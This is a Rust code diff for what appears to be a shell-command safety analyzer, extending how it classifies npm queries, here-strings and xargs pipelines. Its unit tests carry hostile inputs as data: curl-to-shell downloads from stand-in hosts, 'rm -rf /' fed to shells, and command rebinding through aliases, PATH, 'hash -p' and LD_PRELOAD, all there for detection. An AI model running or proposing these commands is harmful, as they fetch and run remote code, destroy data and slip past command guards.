                         .find(|definition| definition.name.eq_ignore_ascii_case(&target))
                     {
                         scan.bodies.push(ExecutableBody {
+                            best_effort: false,
                             input: definition.body.clone(),
                             shell: ShellType::PowerShell,
                             origin: None,
@@ -15320,6 +17989,7 @@ fn powershell_executable_substitution_scan(raw: &str) -> ExecutableSubstitutionS
                     body.push_str(&segment.args.join(" "));
                 }
                 scan.bodies.push(ExecutableBody {
+                    best_effort: false,
                     input: body,
                     shell: ShellType::PowerShell,
                     origin: None,
@@ -15334,6 +18004,7 @@ fn powershell_executable_substitution_scan(raw: &str) -> ExecutableSubstitutionS
             {
                 let body_start = scan.bodies.len();
                 scan.bodies.push(ExecutableBody {
+                    best_effort: false,
                     input: definition.body.clone(),
                     shell: ShellType::PowerShell,
                     origin: None,
@@ -15492,6 +18163,11 @@ fn is_sink_context(segment: &Segment, _all_segments: &[Segment], shell: ShellTyp
             // This segment receives piped input — check if it's an interpreter
             if let Some(cmd) = resolve_segment_command_for_shell(segment, shell) {
                 if is_interpreter(&cmd.name) {
+                    // A proven python data program (`python3 -m json.tool`)
+                    // parses what it is fed and runs nothing named in it.
+                    if crate::rules::command::python_pipe_sink_is_data_program(segment, shell) {
+                        return false;
+                    }
                     if shell == ShellType::Posix {
                         let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
                         return posix_command_accepts_pipeline_as_code(
@@ -15651,6 +18327,100 @@ fn first_package_runner_operand(args: &[String], start: usize, shell: ShellType)
     None
 }
 
+/// The one package operand in a literal POSIX npm metadata query. Options
+/// are consumed by role; later positionals are field names, not more packages.
+/// Unknown option grammar or shell expansion cannot establish this role.
+fn literal_posix_npm_metadata_operand(args: &[String]) -> Option<usize> {
+    let mut subcommand_seen = false;
+    let mut options_terminated = false;
+    let mut index = 0;
+    while index < args.len() {
+        let word = static_wrapper_word(&args[index], ShellType::Posix)?;
+        if !options_terminated && word == "--" {
+            options_terminated = true;
+            index += 1;
+            continue;
+        }
+        if !options_terminated && word.starts_with('-') {
+            let (option, attached) = word
+                .split_once('=')
+                .map_or((word.as_str(), None), |(name, value)| (name, Some(value)));
+            let takes_value = matches!(
+                option,
+                "--registry"
+                    | "--workspace"
+                    | "-w"
+                    | "--prefix"
+                    | "--cache"
+                    | "--userconfig"
+                    | "--globalconfig"
+                    | "--tag"
+                    | "--fetch-retries"
+                    | "--fetch-retry-factor"
+                    | "--fetch-retry-mintimeout"
+                    | "--fetch-retry-maxtimeout"
+                    | "--fetch-timeout"
+                    | "--loglevel"
+            );
+            let boolean = matches!(
+                option,
+                "--json"
+                    | "--parseable"
+                    | "--long"
+                    | "--global"
+                    | "-g"
+                    | "--silent"
+                    | "-s"
+                    | "--quiet"
+                    | "-q"
+                    | "--ignore-scripts"
+                    | "--audit"
+                    | "--no-audit"
+                    | "--fund"
+                    | "--no-fund"
+                    | "--offline"
+                    | "--prefer-offline"
+                    | "--prefer-online"
+                    | "--workspaces"
+                    | "--include-workspace-root"
+            );
+            if takes_value && attached.is_none() {
+                static_wrapper_word(args.get(index + 1)?, ShellType::Posix)?;
+                index += 2;
+            } else if takes_value || boolean {
+                index += 1;
+            } else {
+                return None;
+            }
+            continue;
+        }
+        if !subcommand_seen {
+            if !matches!(word.as_str(), "view" | "info" | "show" | "v") {
+                return None;
+            }
+            subcommand_seen = true;
+            index += 1;
+            continue;
+        }
+        return Some(index);
+    }
+    None
+}
+
+/// A named npm metadata operand can point at a real URL instead of a registry
+/// version (`tool@https://host/archive.tgz`). Split only after a valid package
+/// name, never at a colon in an SCP remote's path.
+fn npm_named_url_selector(raw: &str) -> Option<&str> {
+    let name_end = if let Some(scoped) = raw.strip_prefix('@') {
+        scoped.find('@')? + 1
+    } else {
+        raw.find('@')?
+    };
+    let selector = &raw[name_end + 1..];
+    (registry_package_name(&raw[..name_end]) && has_leading_uri_scheme(selector))
+        .then_some(selector)
+}
+
 /// Package-manager registry specs such as `eslint.config@^1` contain dots but
 /// are not schemeless network destinations. This classifier is deliberately
 /// positional and grammar-bounded: URL/tarball operands that contain a host
@@ -15672,6 +18442,12 @@ fn is_registry_package_operand(
     }
     if has_leading_uri_scheme(&raw) || raw.starts_with("//") || !registry_package_name(&raw) {
         return false;
+    }
+    if command == "npm"
+        && shell == ShellType::Posix
+        && literal_posix_npm_metadata_operand(args) == Some(index)
+    {
+        return true;
     }
 
     let normalized: Vec<String> = args
@@ -16106,6 +18882,7 @@ fn is_non_destination_flag_value(
                         | "--directory-prefix"
                         | "--output-file"
                         | "--append-output"
+                        | "--max-redirect"
                 ) {
                     return true;
                 }
@@ -16373,6 +19150,297 @@ fn looks_like_schemeless_host(s: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn c4_trusted_init_emitters_under_eval_and_source_have_no_gap() {
+        for (input, shell) in [
+            (
+                r#"eval "$(/opt/homebrew/bin/brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(brew shellenv)""#, ShellType::Posix),
+            (r#"eval "$(brew shellenv zsh)""#, ShellType::Posix),
+            (r#"eval "$(direnv hook bash)""#, ShellType::Posix),
+            (r#"eval "$(pyenv init -)""#, ShellType::Posix),
+            (r#"eval "$(pyenv init --path)""#, ShellType::Posix),
+            (r#"eval "$(rbenv init - zsh)""#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)""#, ShellType::Posix),
+            ("eval $(ssh-agent -s)", ShellType::Posix),
+            ("eval `ssh-agent -s`", ShellType::Posix),
+            (r#"eval "$(zoxide init zsh)""#, ShellType::Posix),
+            (r#"eval "$(starship init bash)""#, ShellType::Posix),
+            (
+                r#"eval "$(fnm env --use-on-cd --shell zsh)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(mise activate bash)""#, ShellType::Posix),
+            ("source <(kubectl completion zsh)", ShellType::Posix),
+            (". <(fzf --bash)", ShellType::Posix),
+            ("source <(fzf --zsh)", ShellType::Posix),
+            (
+                r#"if command -v brew >/dev/null; then eval "$(brew shellenv)"; fi"#,
+                ShellType::Posix,
+            ),
+            ("eval (zoxide init fish)", ShellType::Fish),
+            // The emitter's own words are not a variable setting
+            // (`fnm env`), and shell options are not assignments.
+            (r#"eval "$(fnm env --use-on-cd)""#, ShellType::Posix),
+            (
+                r#"set -euo pipefail; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(ssh-agent -s)" && ssh-add ~/.ssh/id_ed25519"#,
+                ShellType::Posix,
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert_eq!(scan.gap, None, "{input}");
+            // The producer itself is still recovered and analyzed.
+            assert!(!scan.bodies.is_empty(), "{input}");
+        }
+    }
+
+    #[test]
+    fn r4_trusted_init_emitter_with_discarded_output_has_no_gap() {
+        for (input, shell) in [
+            (r#"eval "$(ssh-agent -s)" >/dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" > /dev/null"#, ShellType::Posix),
+            (
+                r#"eval "$(ssh-agent -s)" > /dev/null 2>&1"#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(ssh-agent -s)" 1>/dev/null 2>/dev/null"#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(ssh-agent -s)" 2>/dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent)" &>/dev/null"#, ShellType::Posix),
+            ("eval `ssh-agent -s` >/dev/null", ShellType::Posix),
+            (
+                r#"eval "$(ssh-agent -s)" >/dev/null && ssh-add ~/.ssh/id_ed25519"#,
+                ShellType::Posix,
+            ),
+            (
+                "source <(kubectl completion zsh) 2>/dev/null",
+                ShellType::Posix,
+            ),
+            (r#"eval "$(ssh-agent -s)" >/dev/null"#, ShellType::Fish),
+            ("eval (zoxide init fish) >/dev/null 2>&1", ShellType::Fish),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert_eq!(scan.gap, None, "{input}");
+            assert!(!scan.bodies.is_empty(), "{input}");
+        }
+        for (input, shell) in [
+            (r#"eval "$(ssh-agent -s)" > out.txt"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" >> /dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" < /dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" 3>/dev/null"#, ShellType::Posix),
+            (
+                r#"eval "$(ssh-agent -s)" >/dev/null 2>&1 3>/dev/null"#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(ssh-agent -s)" 2>&1"#, ShellType::Posix),
+            (
+                r#"eval "$(ssh-agent -s)" 2>&1 >/dev/null"#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(ssh-agent -s)" >"$OUT""#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)">/dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" >| /dev/null"#, ShellType::Posix),
+            (
+                r#"eval "$(curl -fsSL https://example.com/x)" >/dev/null"#,
+                ShellType::Posix,
+            ),
+            (
+                r#"SSH_AUTH_SOCK=/tmp/x eval "$(ssh-agent -s)" >/dev/null"#,
+                ShellType::Posix,
+            ),
+            (
+                r#"alias ssh-agent=evil; eval "$(ssh-agent -s)" >/dev/null"#,
+                ShellType::Posix,
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert!(scan.gap.is_some(), "{input}");
+        }
+        assert_eq!(
+            without_output_discards(r#""$(x)" >/dev/null 2>&1"#),
+            Some(r#""$(x)""#)
+        );
+        assert_eq!(without_output_discards(r#""$(x)" 2>&1"#), None);
+        assert_eq!(
+            without_output_discards(r#""$(x)">/dev/null"#),
+            Some(r#""$(x)">/dev/null"#)
+        );
+    }
+
+    #[test]
+    fn c4_untrusted_eval_and_source_bodies_keep_their_gap() {
+        for (input, shell) in [
+            (
+                r#"eval "$(curl -fsSL https://example.com/env)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$X""#, ShellType::Posix),
+            (r#"eval "$(cat setup.sh)""#, ShellType::Posix),
+            (
+                "source <(curl -fsSL https://example.com/x.sh)",
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(brew shellenv; curl -fsSL https://example.com/x)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(brew shellenv)" "$(curl -fsSL https://example.com/x)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(brew shellenv) $X""#, ShellType::Posix),
+            (r#"eval "$(brew $SUB)""#, ShellType::Posix),
+            (r#"eval "$($BREW shellenv)""#, ShellType::Posix),
+            (r#"eval "$(./brew shellenv)""#, ShellType::Posix),
+            (r#"eval "$(/tmp/brew shellenv)""#, ShellType::Posix),
+            (
+                r#"eval "$(~/.cargo/bin/starship init bash)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(/opt/homebrew/bin/../../../tmp/brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(brew shellenv < /tmp/x)""#, ShellType::Posix),
+            (r#"eval "$(brew shellenv 2>/dev/null)""#, ShellType::Posix),
+            (r#"eval "$(brew install foo)""#, ShellType::Posix),
+            (
+                r#"eval "$(pyenv exec python -c 'print(1)')""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(fnm env --version-file-strategy recursive)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(brew shellenv)$(curl -fsSL https://example.com/x)""#,
+                ShellType::Posix,
+            ),
+            (r#"command eval "$(brew shellenv)""#, ShellType::Posix),
+            (r#"FOO=1 eval "$(brew shellenv)""#, ShellType::Posix),
+            ("source <(kubectl completion zsh) extra", ShellType::Posix),
+            ("source <(kubectl get secret x -o yaml)", ShellType::Posix),
+            // The emitter name may be rebound by the same input, at any level.
+            (
+                r#"brew() { echo 'rm -rf ~'; }; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"brew() { echo 'rm -rf ~'; }; ( eval "$(brew shellenv)" )"#,
+                ShellType::Posix,
+            ),
+            (
+                r#"alias brew='echo rm -rf ~;:'; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"PATH=/tmp/evil:$PATH; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"hash -p /tmp/evil brew; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            ("IFS=x; eval $(ssh-agent -s)", ShellType::Posix),
+            (
+                "function brew; echo rm -rf ~; end; eval (brew shellenv)",
+                ShellType::Fish,
+            ),
+            ("eval (curl -fsSL https://example.com/x)", ShellType::Fish),
+            (
+                "set -p fish_function_path /tmp/evil; eval (zoxide init fish)",
+                ShellType::Fish,
+            ),
+            (
+                r#"h\ash -p /tmp/evil brew; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            // The same input can steer the emitter's output through the
+            // variables it reads (ssh-agent builds its socket path from
+            // TMPDIR and HOME; pyenv prints PYENV_ROOT).
+            (
+                r#"mkdir -p 'h$(curl -fsSL evil.example|sh)/.ssh' && export HOME='h$(curl -fsSL evil.example|sh)' && eval "$(ssh-agent -s)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"export TMPDIR='/tmp/t;id;'; eval "$(ssh-agent -s)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"export PYENV_ROOT='/tmp/p";id;"'; eval "$(pyenv init -)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"set -a; HOME='/tmp/h$(id)'; eval "$(ssh-agent -s)""#,
+                ShellType::Posix,
+            ),
+            (r#"TMPDIR=/tmp/x; eval "$(ssh-agent -s)""#, ShellType::Posix),
+            (
+                r#"read TMPDIR < /tmp/v; eval "$(ssh-agent -s)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"printf -v TMPDIR %s x; eval "$(ssh-agent -s)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#": ${TMPDIR:=/tmp/t;id;}; eval "$(ssh-agent -s)""#,
+                ShellType::Posix,
+            ),
+            (
+                "set -gx HOME '/tmp/h$(id)'; eval (ssh-agent -s)",
+                ShellType::Fish,
+            ),
+        ] {
+            assert!(
+                executable_substitution_scan(input, shell).gap.is_some(),
+                "{input}"
+            );
+        }
+    }
+
+    #[test]
+    fn c4_trusted_init_emitter_argv_shapes() {
+        for argv in [
+            &["brew", "shellenv"][..],
+            &["/home/linuxbrew/.linuxbrew/bin/brew", "shellenv"],
+            &["/usr/local/bin/direnv", "hook", "zsh"],
+            &["pyenv", "init", "-", "bash"],
+            &["fnm", "env", "--shell=fish", "--use-on-cd"],
+            &["kubectl", "completion", "bash"],
+            &["fzf", "--fish"],
+            &["ssh-agent"],
+            &["ssh-agent", "-s"],
+        ] {
+            assert!(trusted_init_emitter_argv(argv), "{argv:?}");
+        }
+        for argv in [
+            &[][..],
+            &["brew"],
+            &["brew", "shellenv", "powershell"],
+            &["brew", "shellenv", "bash", "zsh"],
+            &["/opt/homebrew/bin/sub/brew", "shellenv"],
+            &["bin/brew", "shellenv"],
+            &["direnv", "hook"],
+            &["ssh-agent", "-c"],
+            &["ssh-agent", "-s", "bash"],
+            &["fnm", "env", "--shell"],
+            &["kubectl", "get", "pods"],
+            &["fzf", "--zsh", "--bash"],
+            &["evil", "shellenv"],
+        ] {
+            assert!(!trusted_init_emitter_argv(argv), "{argv:?}");
+        }
+    }
 
     #[test]
     fn strip_invisible_maps_stealth_whitespace_to_space() {
@@ -17444,6 +20512,81 @@ mod tests {
     }
 
     #[test]
+    fn literal_posix_npm_metadata_selectors_are_registry_specs_not_destinations() {
+        for query in ["view", "info", "show", "v"] {
+            for selector in [
+                "vitest@4.1.11",
+                "'vitest@4.1.11'",
+                "\"vitest@4.1.11\"",
+                "'@scope/tool@^4.1.11'",
+            ] {
+                let input = format!("npm {query} {selector} version");
+                let urls = extract_urls(&input, ShellType::Posix);
+                assert!(urls.is_empty(), "{input}: {urls:?}");
+            }
+        }
+        for input in [
+            "npm view vitest@4.1.11 version --registry=https://registry.npmjs.org/ --userconfig=/qualification/empty.npmrc --globalconfig=/qualification/empty.npmrc --cache=/qualification/npm-cache --fetch-retries=1 --ignore-scripts --no-audit --no-fund",
+            "npm --registry https://registry.npmjs.org/ view vitest@4.1.11 version",
+            "npm view --userconfig /qualification/empty.npmrc --fetch-retries 1 --registry https://registry.npmjs.org/ vitest@4.1.11 version",
+            "npm view -- vitest@4.1.11 version --registry=https://registry.npmjs.org/",
+            "command npm view vitest@4.1.11 version --registry=https://registry.npmjs.org/",
+            "env LANG=C npm info vitest@4.1.11 version --registry=https://registry.npmjs.org/",
+            "env -S 'npm show vitest@4.1.11 version --registry=https://registry.npmjs.org/'",
+            "sh -c 'npm v vitest@4.1.11 version --registry=https://registry.npmjs.org/'",
+        ] {
+            let urls = extract_urls(input, ShellType::Posix);
+            assert!(urls.iter().any(|url| url.parsed.host() == Some("registry.npmjs.org")), "{input}: {urls:?}");
+            assert!(urls.iter().all(|url| url.parsed.host() != Some("4.1.0.11")), "{input}: {urls:?}");
+        }
+    }
+
+    #[test]
+    fn npm_metadata_exemption_does_not_hide_urls_registry_values_or_unknown_roles() {
+        for (input, host) in [
+            ("npm view https://4.1.0.11/package.tgz version", "4.1.0.11"),
+            (
+                "npm info vitest@https://4.1.0.11/package.tgz version",
+                "4.1.0.11",
+            ),
+            ("npm show git@4.1.0.11:repo.git version", "4.1.0.11"),
+            ("npm v 4.1.0.11/package.tgz version", "4.1.0.11"),
+            (
+                "npm view vitest@4.1.11 version --registry=https://4.1.0.11/",
+                "4.1.0.11",
+            ),
+            ("npm view --registry vitest@4.1.11 version", "4.1.0.11"),
+            ("npm view --unknown vitest@4.1.11 version", "4.1.0.11"),
+            ("npm install https://4.1.0.11/package.tgz", "4.1.0.11"),
+        ] {
+            let urls = extract_urls(input, ShellType::Posix);
+            assert!(
+                urls.iter().any(|url| url.parsed.host() == Some(host)),
+                "{input}: {urls:?}"
+            );
+        }
+        for selector in [
+            "vitest@$VERSION",
+            "\"vitest@$VERSION\"",
+            "vitest@$(printf 4.1.11)",
+            "vitest@${VERSION:-4.1.11}",
+        ] {
+            let args = vec!["view".into(), selector.into(), "version".into()];
+            assert!(
+                !is_registry_package_operand("npm", &args, 1, ShellType::Posix),
+                "{selector}"
+            );
+        }
+        for shell in [ShellType::Fish, ShellType::PowerShell, ShellType::Cmd] {
+            let urls = extract_urls("npm view vitest@4.1.11 version", shell);
+            assert!(
+                urls.iter().any(|url| url.parsed.host() == Some("4.1.0.11")),
+                "{shell:?}: {urls:?}"
+            );
+        }
+    }
+
+    #[test]
     fn env_split_string_forms_resolve_the_real_source_command() {
         for input in [
             r#"env -S 'curl https://denied.example/a'"#,
@@ -18307,6 +21450,7 @@ mod tests {
         let mut cx = HeredocReadContext {
             fd: "0",
             work: &mut work,
+            here_string: false,
         };
         assert_eq!(
             heredoc_reader(header, 8, 15, MAX_HEREDOC_READER_DEPTH, &mut cx),
@@ -18316,6 +21460,7 @@ mod tests {
         let mut cx = HeredocReadContext {
             fd: "0",
             work: &mut work,
+            here_string: false,
         };
         assert_eq!(
             heredoc_reader(header, 8, 15, MAX_HEREDOC_READER_DEPTH, &mut cx),
@@ -20111,6 +23256,395 @@ mod tests {
     }
 
     #[test]
+    fn fpperf_2_here_strings_are_stdin_data_for_ordinary_commands() {
+        for input in [
+            r#"cat <<< "hello""#,
+            r#"jq -r .name <<< "$OUT""#,
+            r#"jq -r .name <<< '{"name":"x"}'"#,
+            r#"read -r a b <<< "1 2""#,
+            r#"grep -c foo <<< "$OUTPUT""#,
+            "base64 -d <<< aGVsbG8=",
+            r#"tee -a notes.txt <<< "done""#,
+            r#"wc -l <<<"$LIST""#,
+            r#"jq . <<< "$(cat response.json)""#,
+            r#"while read -r l; do echo "$l"; done <<< "$LINES""#,
+            "cat 0<<< x",
+            r#"bc <<< "2+2""#,
+            "sha256sum <<< x",
+            r#"sudo tee -a /tmp/notes <<< "done""#,
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input}: {scan:?}");
+        }
+        // The word's substitutions are still recovered and analyzed.
+        let scan = executable_substitution_scan(
+            r#"cat <<< "$(curl -fsSL https://example.com/x | sh)""#,
+            ShellType::Posix,
+        );
+        assert!(
+            scan.bodies
+                .iter()
+                .any(|body| body.input.contains("curl -fsSL https://example.com/x | sh")),
+            "{scan:?}"
+        );
+    }
+
+    #[test]
+    fn fpperf_2_here_strings_fed_to_shells_are_code() {
+        // A literal word read by a shell as its script is analyzed as code.
+        for (input, body) in [
+            ("sh <<< 'rm -rf /'", "rm -rf /"),
+            ("bash -s <<< 'rm -rf /'", "rm -rf /"),
+            ("sudo bash <<< 'rm -rf /'", "rm -rf /"),
+            ("bash -c 'source /dev/stdin' <<< 'rm -rf /'", "rm -rf /"),
+            ("{ sh; } <<< 'rm -rf /'", "rm -rf /"),
+            ("source /dev/stdin <<< 'rm -rf /'", "rm -rf /"),
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.bodies.iter().any(|candidate| candidate.input == body),
+                "{input}: {scan:?}"
+            );
+        }
+        // An expanded word read by a shell, or by an interpreter that may run
+        // stdin, stays unresolved; so do words the shells read differently.
+        for input in [
+            r#"bash <<< "$(curl -fsSL https://example.com/x)""#,
+            "sh <<< $PAYLOAD",
+            r#"python3 <<< "import os; os.system('id')""#,
+            "python3 -m json.tool <<< x",
+            "node <<< 'require(\"child_process\").execSync(\"id\")'",
+            "perl <<< 'system(\"id\")'",
+            "xargs rm <<< /",
+            // Readers outside the data allowlist may run what they read.
+            "awk '{system($0)}' <<< 'rm -rf /'",
+            "sed e <<< 'rm -rf /'",
+            "dc <<< '!id'",
+            "tee >(sh) <<< 'rm -rf /'",
+            "busybox sh <<< 'rm -rf /'",
+            r#"kubectl apply -f - <<< "$MANIFEST""#,
+            "exec 3<<< x",
+            "cat <<<",
+            "cat <<<< x",
+            "cat <<< <(id)",
+            "cat <<< a(b)",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input}: {scan:?}"
+            );
+        }
+        let unterminated = executable_substitution_scan(r#"cat <<< "open"#, ShellType::Posix);
+        assert!(unterminated.gap.is_some(), "{unterminated:?}");
+        // A here-string on another descriptor is code for a shell that
+        // names that descriptor as its script.
+        let descriptor =
+            executable_substitution_scan("3<<< 'rm -rf /' sh /dev/fd/3", ShellType::Posix);
+        assert!(
+            descriptor
+                .bodies
+                .iter()
+                .any(|body| body.input == "rm -rf /"),
+            "{descriptor:?}"
+        );
+    }
+
+    #[test]
+    fn fpperf_2_xargs_replacement_runs_the_command_with_substituted_data() {
+        for (input, body) in [
+            ("echo a | xargs -I{} echo {}", "echo {}"),
+            (
+                "git branch --merged | xargs -I{} git branch -d {}",
+                "git branch -d {}",
+            ),
+            ("cat files.txt | xargs -I{} cp {} backup/", "cp {} backup/"),
+            ("cat files.txt | xargs -I {} cp {} backup/", "cp {} backup/"),
+            (
+                "cat files.txt | xargs --replace cp {} backup/",
+                "cp {} backup/",
+            ),
+            (
+                "cat files.txt | xargs --replace={} cp {} backup/",
+                "cp {} backup/",
+            ),
+            ("cat files.txt | xargs -i cp {} backup/", "cp {} backup/"),
+            ("cat files.txt | xargs -I % cp % %.bak", "cp % %.bak"),
+            ("ls | xargs -I{} sudo -u {} id", "sudo -u {} id"),
+            ("git ls-files -m | xargs -I{} git add {}", "git add {}"),
+            (
+                "ls | xargs -I{} sh -c 'echo \"$1\"' _ {}",
+                "sh -c 'echo \"$1\"' _ {}",
+            ),
+            ("ls *.py | xargs -I{} python3 {}", "python3 {}"),
+            ("cat hosts | xargs -I{} ssh {} uptime", "ssh {} uptime"),
+            // An awk input file or `-v` value and a python argv word are data.
+            (
+                "ls | xargs -I{} awk -F: '{print $1}' {}",
+                "awk -F: '{print $1}' {}",
+            ),
+            (
+                "ls | xargs -I{} awk -v name={} '{print name}' data.txt",
+                "awk -v name={} '{print name}' data.txt",
+            ),
+            ("ls | xargs -I{} awk -f prog.awk {}", "awk -f prog.awk {}"),
+            (
+                "ls | xargs -I{} perl -e 'print @ARGV' {}",
+                "perl -e 'print @ARGV' {}",
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input}: {scan:?}");
+            assert!(
+                scan.bodies.iter().any(|candidate| candidate.input == body),
+                "{input}: {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn fpperf_2_xargs_replacement_in_code_stays_unresolved() {
+        for input in [
+            // The item is the command, a shell's -c script, an interpreter's
+            // inline program, the remote command line, or an argument of a
+            // command that runs its arguments.
+            "ls | xargs -I{} {} --version",
+            "ls | xargs -I{} sh -c 'rm -rf {}'",
+            "ls | xargs -I{} bash -c '{}'",
+            "ls | xargs -I {} bash -lc 'echo {}'",
+            "ls | xargs -I REPL sh -c REPL",
+            "ls | xargs -I REPL sh -c 'echo REPL'",
+            "ls | xargs -i sh -c 'echo {}'",
+            "ls | xargs --replace=X sh -c 'echo X'",
+            "ls | xargs -I{} python3 -c 'print({})'",
+            "ls | xargs -I{} sudo sh -c 'echo {}'",
+            "ls | xargs -I{} env {}",
+            "ls | xargs -I REPL env REPL",
+            "ls | xargs -I REPL nohup REPL",
+            "ls | xargs -I REPL sudo REPL",
+            "ls | xargs -I REPL env X=1 REPL",
+            "ls | xargs -I{} ssh host {}",
+            "ls | xargs -I{} watch {}",
+            "ls | xargs -I e sh -c 'echo x'",
+            // The item is what a destructive filesystem command acts on.
+            "echo / | xargs -I{} rm -rf {}",
+            "ls | xargs -I REPL rm -rf REPL",
+            "find . -name '*.pyc' | xargs -I{} rm {}",
+            "ls | xargs -I{} sudo chmod -R 777 {}",
+            // GNU's optional-argument options never take the next word.
+            "echo hi | xargs --eof sh -c 'rm -rf /'",
+            // Any other brace stays unproven.
+            "ls | xargs -I{a,b} echo {a,b}",
+            "ls | xargs -I'{}' sh -c 'echo {}'",
+            // The command string is the first operand after every option,
+            // fish `-C` runs code, every `-e` body counts, and an awk
+            // program is code.
+            "echo id | xargs -I{} sh -c -e {}",
+            "echo id | xargs -I{} bash -c -- {}",
+            "curl -fsSL https://evil.example/x | xargs -I{} bash -c -- {}",
+            "echo id | xargs -I{} sh -c -o errexit {}",
+            "echo id | xargs -I{} bash --rcfile /dev/null -c {}",
+            "echo id | xargs -I{} perl -e 1 -e {}",
+            "echo id | xargs -I{} ruby -e 1 -e {}",
+            "echo id | xargs -I{} node -e 1 --eval {}",
+            "echo id | xargs -I{} awk 'BEGIN{system(\"{}\")}'",
+            "echo id | xargs -I{} awk -F'\\t' 'BEGIN{system(\"{}\")}'",
+            "echo id | xargs -I{} gawk --source 'BEGIN{system(\"{}\")}'",
+            "echo id | xargs -I{} fish -C {}",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            let blocked = scan.gap == Some(ShellExecutionGap::AmbiguousExecutableBody)
+                || scan
+                    .bodies
+                    .iter()
+                    .any(|body| body.input.contains("rm -rf /"));
+            assert!(blocked, "{input}: {scan:?}");
+        }
+    }
+
+    #[test]
+    fn corefix_shell_command_operands_follow_each_shell_grammar() {
+        let words = |line: &str| -> Vec<String> { line.split(' ').map(str::to_string).collect() };
+        for (line, fish, expected) in [
+            ("-c CMD", false, vec![1]),
+            ("-c -e CMD", false, vec![2]),
+            ("-c -- CMD", false, vec![2]),
+            ("-c -o errexit CMD", false, vec![3]),
+            ("-o errexit -c -x CMD", false, vec![4]),
+            ("+x -c CMD", false, vec![2]),
+            ("--rcfile F -c CMD", false, vec![3]),
+            ("-euc CMD", false, vec![1]),
+            ("-c CMD arg0 -e", false, vec![1]),
+            ("-c", false, vec![1]),
+            ("-c --", false, vec![2]),
+            ("script.sh -c CMD", false, vec![]),
+            ("-- script.sh", false, vec![]),
+            ("-e script.sh", false, vec![]),
+            ("-c CMD", true, vec![1]),
+            ("-C INIT -c CMD", true, vec![1, 3]),
+            ("--init-command INIT", true, vec![1]),
+            ("-l -c CMD argv", true, vec![2]),
+            ("script.fish -c CMD", true, vec![]),
+        ] {
+            assert_eq!(
+                shell_command_operands(&words(line), ShellType::Posix, fish),
+                expected,
+                "{line} (fish: {fish})"
+            );
+        }
+    }
+
+    #[test]
+    fn corefix_rebinding_and_variable_text_survive_quote_splitting() {
+        for raw in [
+            "hash -p /bin/sh python3",
+            "h\\ash -p /bin/sh python3",
+            "ha''sh -p /bin/sh python3",
+            "\"hash\" -p /bin/sh python3",
+            "$'\\x68ash' -p /bin/sh python3",
+            "\\x68ash -p /bin/sh python3",
+            "set -p fish_function_path /tmp/evil",
+            "export PYTHONUSERBASE=/tmp/u",
+            "export LD_PRELOAD=/tmp/x.so",
+        ] {
+            assert!(input_may_rebind_commands(raw), "{raw}");
+        }
+        for raw in ["echo ok", "curl -fsSL https://example.com/x", "make -j4"] {
+            assert!(!input_may_rebind_commands(raw), "{raw}");
+        }
+        // The python sink's narrower check: lookup changes and planted
+        // python programs, not every function or alias.
+        for raw in [
+            "ln -sf /bin/sh ~/.local/bin/python3",
+            "export PATH=/tmp/b:$PATH",
+            "ha''sh -p /bin/sh python3",
+            "echo x > ~/.config/fish/functions/python3.fish",
+            "export LD_PRELOAD=/tmp/x.so",
+        ] {
+            assert!(input_may_change_python_lookup(raw), "{raw}");
+        }
+        for raw in [
+            "f () { echo hi; }; f",
+            "function greet; echo hi; end",
+            "echo hashes",
+            "bash -c 'echo hi | python3 -c \"print(1)\"'",
+        ] {
+            assert!(!input_may_change_python_lookup(raw), "{raw}");
+        }
+        for (raw, shell) in [
+            ("HOME=/tmp/x", ShellType::Posix),
